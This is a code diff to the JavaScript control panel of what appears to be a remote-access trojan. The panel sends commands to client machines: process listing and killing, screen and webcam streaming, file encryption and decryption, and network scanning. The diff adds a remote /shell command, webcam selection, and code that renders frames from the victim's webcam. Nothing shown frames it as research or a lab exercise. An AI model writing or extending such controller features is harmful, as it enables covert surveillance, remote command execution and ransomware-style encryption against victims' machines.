@@ -418,9 +418,11 @@
       { cmd: '/ps', desc: 'Show running processes' },
       { cmd: '/kill', desc: 'Kill process by PID' },
       { cmd: '/msgbox', desc: 'Show a message box on the client' },
+      { cmd: '/shell', desc: 'Execute command in interactive shell' },
       { cmd: '/screenstream_start', desc: 'Start screen streaming' },
       { cmd: '/screenstream_stop', desc: 'Stop screen streaming' },
-      { cmd: '/webcam_start', desc: 'Start webcam stream' },
+      { cmd: '/webcam_list', desc: 'List available webcams' },
+      { cmd: '/webcam_start', desc: 'Start webcam stream (e.g., /webcam_start 1)' },
       { cmd: '/webcam_stop', desc: 'Stop webcam stream' },
       { cmd: '/encrypt', desc: 'Encrypt files/folders' },
       { cmd: '/decrypt', desc: 'Decrypt files/folders' },
@@ -1102,6 +1104,12 @@
         case 'msgbox':
           result.text = args;
           break;
+        case 'shell':
+          result.command = args;
+          break;
+        case 'webcam_start':
+          result.index = args;
+          break;
         case 'network_scan':
           result.range = args || '192.168.1.0/24';
           break;
@@ -1210,6 +1218,18 @@
     }
 
     function displayWebcamFrame(data) {
+      if (!webcamCanvas) return;
+      
+      const ctx = webcamCanvas.getContext('2d');
+      const img = new Image();
+      
+      img.onload = function() {
+        webcamCanvas.width = img.width;
+        webcamCanvas.height = img.height;
+        ctx.drawImage(img, 0, 0);
+      };
+      img.src = `data:image/jpeg;base64,${data.data}`;
+
       webcamContainer.classList.remove('hidden');
       mediaPlaceholder.classList.add('hidden');
       webcamStatus.textContent = 'Webcam Stream aktiv';
